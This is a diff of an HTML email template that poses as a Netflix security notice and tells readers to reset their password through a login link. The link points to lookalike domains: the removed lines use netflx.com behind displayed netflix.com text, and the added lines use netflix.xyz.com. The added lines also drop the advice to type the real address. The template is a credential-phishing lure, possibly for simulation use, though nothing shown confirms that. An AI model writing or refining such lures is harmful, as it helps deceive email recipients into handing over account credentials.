@@ -136,9 +136,9 @@ a[x-apple-data-detectors='true'] {
 <p style="font-size: 14px; line-height: 150%;">&nbsp;</p>
 <p style="font-size: 14px; line-height: 150%;">We believe that your Netflix account credentials may have been included in a recent release of email addresses and passwords from an older breach at another company. Just to be safe, we've reset your password as a&nbsp; precautionary measure. </p>
 <p style="font-size: 14px; line-height: 150%;">&nbsp;</p>
-<p style="font-size: 14px; line-height: 150%;">Please visit the login help page at <a rel="noopener" href="https://netflx.com/loginhelp" target="_blank">https://www.netflix.com/loginhelp</a> or type <a rel="noopener" href="http://www.netflix.com" target="_blank">www.netflix.com </a>in your browser, click on "sign in", and then click "forgot your email or password." Follow the instructions to reset your password.</p>
+<p style="font-size: 14px; line-height: 150%;">Please visit the login help page at <a rel="noopener" href="https://netflix.xyz.com/loginhelp" target="_blank">https://www.netflix.xyz.com/loginhelp</a>, click on "sign in", and then click "forgot your email or password." Follow the instructions to reset your password.</p>
 <p style="font-size: 14px; line-height: 150%;">&nbsp;</p>
-<p style="font-size: 14px; line-height: 150%;">For more information and recommendation on how to keep your Netflix account secure, please visit out <a rel="noopener" href="https://www.netfix.com/helpcenter" target="_blank">Help Center</a>.</p>
+<p style="font-size: 14px; line-height: 150%;">For more information and recommendation on how to keep your Netflix account secure, please visit out <a rel="noopener" href="https://www.netflix.com/helpcenter" target="_blank">Help Center</a>.</p>
 <p style="font-size: 14px; line-height: 150%;">&nbsp;</p>
 <p style="font-size: 14px; line-height: 150%;">- The Netflix Team</p>
   </div>
